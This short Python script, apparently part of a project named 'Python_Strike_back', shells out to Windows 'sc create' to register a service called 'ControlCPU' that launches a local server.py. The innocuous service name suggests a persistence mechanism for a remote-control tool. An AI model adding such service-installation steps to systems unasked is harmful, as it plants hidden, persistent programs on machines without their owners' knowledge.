 # -*- coding: utf-8 -*-
__author__ = 'Vincent Bathellier'

from os import popen
path = 'C:\Users\JUMEAUX\Documents\GitHub\Python_Strike_back\server.py'
popen("sc create ControlCPU binpath= "+path+"")
